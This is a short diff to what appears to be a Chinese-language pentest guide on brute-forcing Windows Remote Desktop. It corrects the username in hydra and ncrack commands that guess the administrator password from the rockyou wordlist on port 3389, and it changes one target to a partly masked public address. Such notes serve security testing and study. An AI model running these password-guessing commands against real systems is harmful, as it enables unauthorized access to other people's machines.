@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds
 使用hydra暴力破解：
 
 ```
-hydra -t 4 -V -l adminstrator -P /usr/share/wordlists/rockyou.txt rdp://your_target
+hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://your_target
 ```
 
 ```
@@ -46,7 +46,7 @@ rdp:// = Port 3389
 使用ncrack暴力破解：
 
 ```
-ncrack -p 3389 -v -user adminstrator -P /usr/share/wordlists/rockyou.txt 192.168.xx.xx
+ncrack -p 3389 -v -user administrator -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
 ```
 
 ```
